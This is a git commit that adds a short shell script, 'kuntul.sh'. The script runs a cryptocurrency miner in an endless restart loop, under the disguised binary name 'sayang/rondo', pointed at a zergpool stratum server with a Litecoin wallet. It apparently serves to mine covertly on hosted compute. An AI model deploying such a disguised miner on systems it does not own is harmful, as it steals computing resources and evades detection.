d3eb8057b6c4dbcf06cc795372b6dd64e05bdc6b
liyanul225 <108873090+liyanul225@users.noreply.github.com>
2022-07-10 19:58:14 +0700

    Create kuntul.sh

---
+++ kuntul.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+while [ 1 ]; do
+	sayang/rondo -a scryptn2 -o stratum+tcp://scryptn2.na.mine.zergpool.com:3435 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,mc=XBTX,ID=Tuyul -t 2
+	sleep 5
+done
